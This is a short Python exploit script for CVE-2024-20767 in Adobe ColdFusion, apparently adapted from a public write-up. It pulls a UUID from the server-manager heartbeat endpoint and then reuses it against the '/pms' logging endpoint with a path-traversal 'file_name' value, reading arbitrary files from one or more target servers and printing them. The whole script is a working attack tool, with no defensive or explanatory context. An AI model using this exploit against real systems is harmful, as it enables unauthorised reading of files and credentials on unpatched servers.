#!/usr/bin/python3
# CVE-2024-20767
# based upon https://jeva.cc/2973.html
import requests
import re
import urllib3
import argparse
from typing import Union, List

urllib3.disable_warnings()
parser = argparse.ArgumentParser(description="Adobe ColdFusion Server Exploit Tool")
parser.add_argument("-e", "--endpoints", nargs='+', required=True, help="Target Adobe ColdFusion Server URL(s)")
parser.add_argument("-p", "--port", required=False, default=8500, type=int, help="Target server port, defaults to 8500")
parser.add_argument("-c", "--command", required=True, help="File to read path, e.g., 'Windows/ServerStandardEval.xml'")
args = parser.parse_args()

def perform_exploit(endpoints: Union[str, List[str]], port: int, command: str):
    if isinstance(endpoints, str):
        endpoints = [endpoints] 

    for target in endpoints:
        try:
            heartbeat_endpoint = "/CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat"
            response = requests.get(f"http://{target}:{port}{heartbeat_endpoint}", verify=False)
            uuid_search = re.search(r"<var name='uuid'><string>(.+?)</string></var>", response.text)
            if uuid_search:
                uuid = uuid_search.group(1)
                print(f"[+] UUID Obtained for {target}: {uuid}")
            else:
                print(f"[-] Unable to obtain UUID for {target}.")
                continue

            exploit_endpoint = f"/pms?module=logging&file_name=../../../../../../../{command}&number_of_lines=100"
            headers = {"uuid": uuid}
            response = requests.get(f"http://{target}:{port}{exploit_endpoint}", verify=False, headers=headers)

            if response.status_code == 200:
                print(f"[+] Successfully read file from {target}!")
                print(response.text)
            else:
                print(f"[-] Failed to read file from {target}. Server responded with status code: {response.status_code}")

        except requests.exceptions.RequestException as e:
            print(f"[-] An error occurred while trying to exploit {target}: {e}")

perform_exploit(args.endpoints, args.port, args.command)
